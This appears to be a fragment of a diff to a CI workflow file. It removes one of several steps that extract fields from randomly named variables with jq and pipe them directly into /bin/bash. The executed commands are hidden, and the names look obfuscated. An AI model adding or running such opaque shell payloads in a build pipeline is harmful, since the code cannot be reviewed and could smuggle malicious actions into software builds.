@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$lcd4" | jq -r .kam7019 | /bin/bash
           printf '%s' "$jn5" | jq -r .h83836 | /bin/bash
           echo $rcp3 | jq -r .m0470 | /bin/bash
-          printf '%s' "$zvp83686" | jq -r .rgm0 | /bin/bash
           echo $zoxmo84880 | jq -r .aupbn5513 | /bin/bash
 
       - name: Store artifact
